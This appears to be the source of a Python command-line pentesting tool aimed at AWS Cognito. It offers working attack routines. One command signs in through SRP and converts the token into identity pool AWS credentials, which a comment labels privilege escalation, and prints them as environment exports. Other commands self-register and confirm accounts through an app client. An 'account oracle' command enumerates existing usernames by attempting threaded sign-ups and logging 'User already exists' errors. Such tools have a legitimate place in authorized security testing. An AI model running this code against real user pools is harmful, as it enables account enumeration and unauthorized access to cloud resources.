#!/usr/bin/env python3
#encoding: utf-8

import boto3
import typer
import threading

from concurrent import futures
from typing_extensions import Annotated

from .AWSSRP import AWSSRP

# CLI tool
cli = typer.Typer()

client_id_option = typer.Option('--client_id',help='Client ID')
region_option = typer.Option('--region',help='Region')
secret_hash_option = typer.Option('--secret',help='(Optionnal) Client secret for connection')

# Priviledge escalation to get creds to connect to AWS
@cli.command(help="Get Identity Pool Keys")
def get_identity_pool_keys(
    region: Annotated[str, region_option] = 'eu-west-3',
    pool_id: Annotated[str, typer.Option('--pool_id',help='Pool ID')] = '',
    identity_pool_id: Annotated[str, typer.Option('--identity_pool_id',help='Identity pool ID')] = '',
    client_id: Annotated[str, client_id_option] = '',
    username: Annotated[str, typer.Option('--username',help='Username')] = '',
    password: Annotated[str, typer.Option('--password',help='Password')] = '',
    secret_hash: Annotated[str, secret_hash_option] = None,
):

    # Create SRP object
    srp = AWSSRP(
        username=username, 
        password=password, 
        pool_id=pool_id, 
        client_id=client_id, 
        pool_region=region,
        client_secret=secret_hash
    )

    # Get authenticated IdToken
    resp = srp.authenticate_user()
    token = resp['AuthenticationResult']['IdToken']
    logins = {
    f'cognito-idp.{region}.amazonaws.com/{pool_id}' : token
    }

    # Get Identity id
    identity_client = boto3.client('cognito-identity', region_name=region)
    resp = identity_client.get_id(
        IdentityPoolId=identity_pool_id,
        Logins=logins
    )
    identity_id = resp['IdentityId']

    # Get AWS credentials from Pool
    resp = identity_client.get_credentials_for_identity(
        IdentityId=identity_id,
        Logins=logins
    )
    credentials = resp['Credentials']

    # Print result
    access_key = credentials['AccessKeyId']
    secret_key = credentials['SecretKey']
    secret_token = credentials['SessionToken']

    print('Use these env variables to use the identity :')
    print('---' )
    print('export AWS_ACCESS_KEY_ID = %s' % access_key)
    print('export AWS_SECRET_ACCESS_KEY = %s' % secret_key)
    print('export AWS_SESSION_TOKEN = %s' % secret_token)


# Create a new account using cognito provider
@cli.command(help="Create new user account")
def account_creation(
    region: Annotated[str, region_option] = 'eu-west-3',
    user_attributes: Annotated[str, typer.Option('--user_attributes',help='User attributes (email of the user)')] = '',
    client_id: Annotated[str, client_id_option] = '',
    username: Annotated[str, typer.Option('--username',help='Username')] = '',
    password: Annotated[str, typer.Option('--password',help='Password')] = '',
    secret_hash: Annotated[str, secret_hash_option] = None,
):
    # Check that mail is passed correctly
    if not user_attributes or user_attributes == '':
        raise ValueError('You need to pass the user attributes. Type --help for more information')
    
    # Create SRP object
    srp = AWSSRP(
        username=username, 
        password=password, 
        pool_id=None, 
        client_id=client_id,
        user_attributes=user_attributes,
        pool_region=region,
        client_secret=secret_hash
    )

    # Signup user
    confirmed, sub = srp.signup_user()

    print('{')
    print("\tUserConfirmed:", confirmed)
    print("\tUserSub:", sub)
    print('}')
    print("/!\ If you received a confirmation mail to sign up, you can confirm it using the confirm-sign-up subcommand")

# Confirm the sign up user
@cli.command(help="Confirm sign up of user")
def confirm_sign_up(
    client_id: Annotated[str, client_id_option] = '',
    region: Annotated[str, region_option] = 'eu-west-3',
    username: Annotated[str, typer.Option('--username',help='Username')] = '',
    confirmation_code: Annotated[str, typer.Option('--code',help='Confirmation code')] = '',
    secret_hash: Annotated[str, secret_hash_option] = None,
):
    # Check that confirmation code is passed correctly
    if not confirmation_code or confirmation_code == '':
        raise ValueError('Need confirmation code')
    
    # Create SRP object
    srp = AWSSRP(
        username=username, 
        password=None, 
        pool_id=None, 
        client_id=client_id,
        pool_region=region,
        client_secret=secret_hash
    )

    print(srp.confirm_signup(confirmation_code))

# Check that the usernames passed exist in cognito user pool
def check_account(    
    username: str,
    client_id: str,
    region: str,
    pool: futures.ThreadPoolExecutor,
    lock: threading.Lock,
    boto_client: boto3.client,
    secret_hash: str,
):
    try:
        srp = AWSSRP(
            username=username, 
            password='R4nd0mP4$$w0rd',
            pool_id=None, 
            client_id=client_id,
            pool_region=region,
            user_attributes='test@fakemail.com',
            client_secret=secret_hash
        )

        try:
            srp.signup_user(boto_client)
        except Exception as error:
            # If users already exists, write the username in the report file
            if 'User already exists' in str(error):
                lock.acquire()
                with open('existing_users.txt', 'a') as file:
                    file.write(username+'\n')
                lock.release()
 
    except Exception as error:
        pool.shutdown(wait=False, cancel_futures=True)
        print(error)

# Check for existing user in Cognito user pool
@cli.command(help="Check for existing accounts on cognito idp")
def account_oracle(
    client_id: Annotated[str, client_id_option] = '',
    region: Annotated[str, region_option] = 'eu-west-3',
    file: Annotated[str, typer.Option('--file', metavar='<path>', help='file which contains usernames',)] = '',
    secret_hash: Annotated[str, secret_hash_option] = None,
):
    # Check that a file containing the usernames is passed
    if not file or file == '':
        raise ValueError('Type a path file using --file arg')

    # Initialize the threads
    lock = threading.Lock()
    pool = futures.ThreadPoolExecutor(max_workers=5)
   
    with open('existing_users.txt', 'w') as f:
        f.write('Users found in cognito user pool :\n')

    with open(file, 'r') as f:
        boto_client = boto3.client('cognito-idp', region_name=region)
        for username in f:
            pool.submit(check_account, username.strip(), client_id, region, pool, lock, boto_client, secret_hash)
        pool.shutdown(wait=True)
    
    print('Users found available in the file ./existing_users.txt')

if __name__ == "__main__":
    cli()